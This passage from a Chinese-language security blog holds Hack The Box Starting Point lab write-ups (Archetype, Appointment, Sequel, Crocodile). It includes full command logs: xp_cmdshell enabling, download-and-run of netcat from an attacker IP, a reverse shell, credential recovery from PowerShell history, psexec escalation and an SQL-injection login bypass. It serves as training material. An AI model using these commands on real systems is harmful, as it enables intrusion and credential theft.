C:\Users\sql_svc\Downloads; wget http://10.10.14.92/nc64.exe -outfile nc64.exe&#x27;</span></span><br><span class="line">nc -nvlp 443</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.92 443&#x27;</span></span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; dir&#x27;</span></span><br><span class="line">wget https://github.com/int0x33/nc.exe/blob/master/nc.exe</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.92/nc.exe -outfile nc.exe&#x27;</span></span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; dir&#x27;</span></span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe 10.10.14.92 443&#x27;</span></span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; ls C:\Users\sql_svc\Downloads\nc.exe&#x27;</span></span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.92 4443&#x27;</span></span><br><span class="line">wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe?raw=<span class="literal">true</span></span><br><span class="line"><span class="built_in">mv</span> <span class="string">&#x27;nc64.exe?raw=true&#x27;</span> nc2.exe</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.92/nc2.exe -outfile nc2.exe&#x27;</span></span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; .\nc2.exe -e cmd.exe 10.10.14.92 4443&#x27;</span></span><br><span class="line">C:\Users\sql_svc\Downloads&gt;<span class="built_in">type</span> user.txt</span><br><span class="line">wget https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe?raw=<span class="literal">true</span></span><br><span class="line"><span class="built_in">mv</span> <span class="string">&#x27;winPEASx64.exe?raw=true&#x27;</span> winPEASx64.exe</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.92/winPEASx64.exe -outfile winPEASx64.exe&#x27;</span></span><br><span class="line"><span class="built_in">cd</span> C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\</span><br><span class="line"><span class="built_in">type</span> ConsoleHost_history.txt</span><br><span class="line">administrator MEGACORP_4dm1n!!</span><br><span class="line">python3 psexec.py administrator@10.129.95.187</span><br><span class="line"><span class="built_in">cd</span> C:\Users\Administrator\Desktop</span><br><span class="line">python3 psexec.py administrator@10.129.95.187</span><br><span class="line"><span class="built_in">type</span> root.txt</span><br></pre></td></tr></table></figure>
-<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>1.Which TCP port is hosting a database server? </p>
-<p>1433</p>
-<p>2.What is the name of the non-Administrative share available over SMB?</p>
-<p>backups</p>
-<p>3.What is the password identified in the file on the SMB share?</p>
-<p>M3g4c0rp123</p>
-<p>4.What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?</p>
-<p>mssqlclient.py</p>
-<p>5.What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?</p>
-<p>xp_cmdshell</p>
-<p>6.What script can be used in order to search possible paths to escalate privileges on Windows hosts?</p>
-<p>WinPEAS</p>
-<p>7.What file contains the administrator’s password?</p>
-<p>ConsoleHost_history.txt</p>
-<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>扩展存储过程 (Extended Stored Procedure): 在数据库里，”存储过程”就是一段提前写好的 SQL 代码。而”扩展存储过程”允许 MSSQL 数据库调用外部的动态链接库（DLL），这意味着数据库可以直接与底层的 Windows 操作系统进行交互。</p>
-<p>在现代的 MSSQL 版本（2005 之后）中，出于安全考虑，微软默认禁用了 xp_cmdshell。</p>
-<p>因此在实际的打靶或实战中，如果攻击者拥有极高的权限（如 SA），通常需要先执行几条特定的 SQL 语句把它重新开启，然后才能使用。开启命令通常如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-- 1. 允许修改高级配置</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line">-- 2. 开启 xp_cmdshell</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line">EXEC xp_cmdshell &#x27;net user&#x27;;</span><br></pre></td></tr></table></figure>
-<p>在github上下载的exe文件，如果不指定raw格式，则会下载整个文件，这是一个大的踩坑点：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe?raw=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
-<h2 id="详细记录"><a href="#详细记录" class="headerlink" title="详细记录"></a>详细记录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- --min-rate 5000 10.129.129.122</span><br><span class="line">[sudo] password for zyu:</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-13 09:00 EDT</span><br><span class="line">Warning: 10.129.129.122 giving up on port because retransmission cap hit (10).</span><br><span class="line">Nmap scan report for 10.129.129.122</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 65523 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">1433/tcp  open  ms-sql-s</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">47001/tcp open  winrm</span><br><span class="line">49664/tcp open  unknown</span><br><span class="line">49665/tcp open  unknown</span><br><span class="line">49666/tcp open  unknown</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49668/tcp open  unknown</span><br><span class="line">49669/tcp open  unknown</span><br><span class="line"></span><br><span class="line">smbclient -L 10.129.129.122</span><br><span class="line">Password for [WORKGROUP\zyu]:</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        backups         Disk</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line">do_connect: Connection to 10.129.129.122 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br><span class="line"></span><br><span class="line">&lt;DTSConfiguration&gt;</span><br><span class="line">    &lt;DTSConfigurationHeading&gt;</span><br><span class="line">        &lt;DTSConfigurationFileInfo GeneratedBy=&quot;...&quot; GeneratedFromPackageName=&quot;...&quot; GeneratedFromPackageID=&quot;...&quot; GeneratedDate=&quot;20.1.2019 10:01:34&quot;/&gt;</span><br><span class="line">    &lt;/DTSConfigurationHeading&gt;</span><br><span class="line">    &lt;Configuration ConfiguredType=&quot;Property&quot; Path=&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot; ValueType=&quot;String&quot;&gt;</span><br><span class="line">        &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;</span><br><span class="line">    &lt;/Configuration&gt;</span><br><span class="line">&lt;/DTSConfiguration&gt; </span><br><span class="line"></span><br><span class="line">Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc</span><br><span class="line"></span><br><span class="line">sudo python mssqlclient.py ARCHETYPE/sql_svc@10.129.129.122 -windows-auth</span><br><span class="line">[sudo] password for zyu:</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(ARCHETYPE): Line 1: Changed database context to &#x27;master&#x27;.</span><br><span class="line">[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt;</span><br><span class="line"></span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; xp_cmdshell ‘net user’;</span><br><span class="line">ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure &#x27;sys.xp_cmdshell&#x27; of component &#x27;xp_cmdshell&#x27; because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of &#x27;xp_cmdshell&#x27; by using sp_configure. For more information about enabling &#x27;xp_cmdshell&#x27;, search for &#x27;xp_cmdshell&#x27; in SQL Server Books Online.</span><br><span class="line"></span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; SELECT is_srvrolemember(&#x27;sysadmin&#x27;);</span><br><span class="line"></span><br><span class="line">-</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">INFO(ARCHETYPE): Line 185: Configuration option &#x27;show advanced options&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; RECONFIGURE;</span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">INFO(ARCHETYPE): Line 185: Configuration option &#x27;xp_cmdshell&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; RECONFIGURE;</span><br><span class="line">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; EXEC xp_cmdshell &#x27;net user&#x27;;</span><br><span class="line">output</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line">User accounts for \\ARCHETYPE</span><br><span class="line"></span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Administrator            DefaultAccount           Guest</span><br><span class="line"></span><br><span class="line">sql_svc                  WDAGUtilityAccount</span><br><span class="line"></span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line"># 稳定反向shell获取</span><br><span class="line">wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe?raw=true</span><br><span class="line">mv &#x27;nc64.exe?raw=true&#x27; nc2.exe</span><br><span class="line">EXEC xp_cmdshell &#x27;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.92/nc2.exe -outfile nc2.exe&#x27;</span><br><span class="line">EXEC xp_cmdshell &#x27;powershell -c cd C:\Users\sql_svc\Downloads; .\nc2.exe -e cmd.exe 10.10.14.92 4443&#x27;</span><br><span class="line">C:\Users\sql_svc\Downloads&gt;</span><br><span class="line">C:\Users\sql_svc\Desktop&gt;type user.txt</span><br><span class="line">type user.txt</span><br><span class="line"></span><br><span class="line">    PowerShell Settings</span><br><span class="line">    PowerShell v2 Version: 2.0</span><br><span class="line">    PowerShell v5 Version: 5.1.17763.1</span><br><span class="line">    PowerShell Core Version:</span><br><span class="line">    Transcription Settings:</span><br><span class="line">    Module Logging Settings:</span><br><span class="line">    Scriptblock Logging Settings:</span><br><span class="line">    PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span><br><span class="line">    PS history size: 79B</span><br><span class="line"></span><br><span class="line">Analyzing Windows Files Files (limit 70)</span><br><span class="line">    C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span><br><span class="line">    C:\Users\Default\NTUSER.DAT</span><br><span class="line">    C:\Users\sql_svc\NTUSER.DAT</span><br><span class="line"></span><br><span class="line">type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span><br><span class="line">C:\Users\sql_svc\Downloads&gt;cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\</span><br><span class="line">cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\</span><br><span class="line"></span><br><span class="line">C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 9565-0B4F</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine</span><br><span class="line"></span><br><span class="line">01/20/2020  06:04 AM    &lt;DIR&gt;          .</span><br><span class="line">01/20/2020  06:04 AM    &lt;DIR&gt;          ..</span><br><span class="line">03/17/2020  02:36 AM                79 ConsoleHost_history.txt</span><br><span class="line">               1 File(s)             79 bytes</span><br><span class="line">               2 Dir(s)  10,754,007,040 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&gt;type ConsoleHost_history.txt</span><br><span class="line">type ConsoleHost_history.txt</span><br><span class="line">net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!</span><br><span class="line">exit</span><br><span class="line">python3 psexec.py administrator@10.129.95.187</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Requesting shares on 10.129.95.187.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file hvfcrhtO.exe</span><br><span class="line">[*] Opening SVCManager on 10.129.95.187.....</span><br><span class="line">[*] Creating service aWaI on 10.129.95.187.....</span><br><span class="line">[*] Starting service aWaI.....</span><br><span class="line">[!] Press help for extra shell commands                                                                                                                        Microsoft Windows [Version 10.0.17763.2061]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; cd C:\Users\Administrator\Desktop</span><br><span class="line">C:\Users\Administrator\Desktop&gt; dir                                                                                                                             Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 9565-0B4F</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line">07/27/2021  02:30 AM    &lt;DIR&gt;          .</span><br><span class="line">07/27/2021  02:30 AM    &lt;DIR&gt;          ..</span><br><span class="line">02/25/2020  07:36 AM                32 root.txt</span><br><span class="line">               1 File(s)             32 bytes</span><br><span class="line">               2 Dir(s)  10,328,911,872 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt; type root.txt </span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://zyufoye.github.io/2026/05/17/Hackthebox-StartingPoint-Tier1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/uploads/kehan.jpg">
-      <meta itemprop="name" content="Aono">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Aono Note">
-      <meta itemprop="description" content="专注于网络安全学习与实践的个人博客，记录AI安全、攻防技术、漏洞分析、工具使用与踩坑经验。 不生产知识，只做知识的搬运工。">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Aono Note">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2026/05/17/Hackthebox-StartingPoint-Tier1/" class="post-title-link" itemprop="url">Hackthebox-StartingPoint-Tier1</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2026-05-17 20:37:10 / 修改时间：20:40:19" itemprop="dateCreated datePublished" datetime="2026-05-17T20:37:10+08:00">2026-05-17</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/HTB/" itemprop="url" rel="index"><span itemprop="name">HTB</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>Tier1引入基础的漏洞利用技术略微增加了难度。</p>
-<h1 id="Appointment"><a href="#Appointment" class="headerlink" title="Appointment"></a>Appointment</h1><p>1.What does the acronym SQL stand for?</p>
-<p>SQL 是什么的缩写？</p>
-<p> Structured Query Language  </p>
-<p>2.What is one of the most common type of SQL vulnerabilities?</p>
-<p>最常见的 SQL 漏洞类型之一是什么？</p>
-<p>sql injection</p>
-<p>3.What is the 2021 OWASP Top 10 classification for this vulnerability?</p>
-<p>该漏洞在 2021 年 OWASP Top 10 中的分类是什么？</p>
-<p>A03:2021-Injection</p>
-<p>4.What does Nmap report as the service and version that are running on port 80 of the target?</p>
-<p>Nmap 报告称，目标主机 80 端口上运行的服务和版本是什么？</p>
-<p>Apache httpd 2.4.38 ((Debian))</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -Pn -p 80 -sCV 10.129.125.97</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-11 04:15 EDT</span><br><span class="line">Nmap scan report for localhost (10.129.125.97)</span><br><span class="line">Host is up (1.9s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 171.25 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>5.What is the standard port used for the HTTPS protocol?</p>
-<p>HTTPS 协议的标准端口是什么？</p>
-<p>443</p>
-<p>6.What is a folder called in web-application terminology?</p>
-<p>在 Web 应用程序术语中，文件夹叫什么？</p>
-<p>directory</p>
-<p>7.What is the HTTP response code that is returned for Not Found errors?</p>
-<p>对于 Not Found ”错误，HTTP 响应代码是什么？</p>
-<p>404</p>
-<p>8.Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we’re looking to discover directories, and not subdomains?</p>
-<p>Gobuster 是一款用于暴力破解 Web 服务器目录的工具。在使用 Gobuster 时，我们应该使用哪个参数来指定我们要查找的是目录而不是子域名？</p>
-<p>dir</p>
-<p>9.What single character can be used to comment out the rest of a line in MySQL?</p>
-<p>在 MySQL 中，可以用哪个字符注释掉一行剩余的内容？</p>
-<p>#</p>
-<p>10.If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?</p>
-<p>如果用户输入处理不当，可能会被解读为评论。假设用户在不知道密码的情况下，使用评论以管理员身份登录，返回的网页上的第一个单词是什么？</p>
-<p>congratulations</p>
-<p>11.we can use credentials as admin’# and password can be anything</p>
-<p>我们可以使用 admin’# 作为凭据，密码可以是任何内容。即可看到flag。</p>
-<h1 id="Sequel"><a href="#Sequel" class="headerlink" title="Sequel"></a>Sequel</h1><p>1.During our scan, which port do we find serving MySQL?</p>
-<p>扫描过程中，我们发现哪个端口在运行 MySQL？</p>
-<p>3306</p>
-<p>2.What community-developed MySQL version is the target running?</p>
-<p>目标系统运行的是哪个社区开发的 MySQL 版本？</p>
-<p>MariaDB</p>
-<p>3.When using the MySQL command line client, what switch do we need to use in order to specify a login username?</p>
-<p>使用 MySQL 命令行客户端时，我们需要使用哪个开关来指定登录用户名？</p>
-<p>-u</p>
-<p>4.Which username allows us to log into this MariaDB instance without providing a password?</p>
-<p>哪个用户名允许我们在不提供密码的情况下登录此 MariaDB 实例？</p>
-<p>root</p>
-<p>5.In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?</p>
-<p>在 SQL 中，我们可以使用哪个符号在查询中指定要显示表中的所有内容？</p>
-<p>*</p>
-<p>6.In SQL, what symbol do we need to end each query with?</p>
-<p>在 SQL 中，每个查询语句的结尾需要使用什么符号？</p>
-<p>;</p>
-<p>7.There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that’s unique to this host?</p>
-<p>此 MySQL 实例中有三个数据库是所有 MySQL 实例共有的。第四个数据库是此主机独有的，它的名称是什么？</p>
-<p>htb</p>
-<p>8.What is the command in MySQL to select a database to interact with?</p>
-<p>在 MySQL 中，选择要交互的数据库的命令是什么？</p>
-<p>use</p>
-<p>9.What is the command in MySQL to show the different columns for a given table?</p>
-<p>在 MySQL 中，显示给定表中不同列的命令是什么？</p>
-<p>describe</p>
-<p>10.Which table has a column named “flag”?</p>
-<p>哪个表有一个名为“flag”的列？</p>
-<p>config</p>
-<p>select * from config;</p>
-<h1 id="Crocodile"><a href="#Crocodile" class="headerlink" title="Crocodile"></a>Crocodile</h1><p>1.What Nmap scanning switch employs the use of default scripts during a scan?</p>
-<p>Nmap 扫描过程中，哪个扫描开关会使用默认脚本？</p>
-<p>-sC</p>
-<p>2.What service version is found to be running on port 21?</p>
-<p>在端口 21 上运行的服务版本是什么？</p>
-<p>vsFTPd 3.0.3</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p 21 -sCV 10.129.127.95</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-12 10:49 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (10.129.127.95)</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-syst:</span><br><span class="line">|   STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:10.10.17.43</span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth <span class="built_in">limit</span></span><br><span class="line">|      Session <span class="built_in">timeout</span> <span class="keyword">in</span> seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist</span><br><span class="line">|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd</span><br><span class="line">Service Info: OS: Unix</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>3.What FTP code is returned to us for the “Anonymous FTP login allowed” message?</p>
-<p>对于“允许匿名 FTP 登录”消息，返回给我们的 FTP 代码是什么？</p>
-<p>230</p>
-<p>4.After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?</p>
-<p>使用 FTP 客户端连接到 FTP 服务器后，当系统提示匿名登录时，我们应该提供什么用户名？</p>
-<p>anonymous</p>
-<p>5.After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server?</p>
-<p>匿名连接到 FTP 服务器后，我们可以使用什么命令下载在 FTP 服务器上找到的文件？</p>
-<p>get</p>
